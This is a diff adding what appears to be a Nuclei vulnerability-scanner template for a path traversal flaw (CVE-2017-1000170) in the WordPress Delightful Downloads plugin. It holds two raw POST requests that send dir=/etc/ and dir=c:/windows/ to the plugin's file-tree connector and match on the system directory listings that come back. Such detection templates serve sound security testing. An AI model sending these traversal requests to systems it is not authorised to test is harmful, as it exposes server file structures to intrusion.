@@ -1,0 +1,47 @@
+id: wordpress-delightful-downloads-lfi
+info:
+  name: WordPress Delightful Downloads LFI (CVE-2017-1000170)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WordPress Delightful Downloads Jquery File Tree plugin versions 1.6.6 and below are vulnerable to a path traversal exploit.
+  tags: directory-traversal, wordpress
+  reference:
+    - https://packetstormsecurity.com/files/161900/WordPress-Delightful-Downloads-Jquery-File-Tree-1.6.6-Path-Traversal.html
+  classification:
+    cvss-score: 5.6
+    cve-id: CVE-2017-1000170
+    cwe-id: CWE-22
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dir=/etc/
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "class=\"jqueryFileTree\""
+          - "/etc/passwd"
+  - raw:
+      - |
+        POST /wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dir=c:/windows/
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "directory collapsed"
+          - "System32"
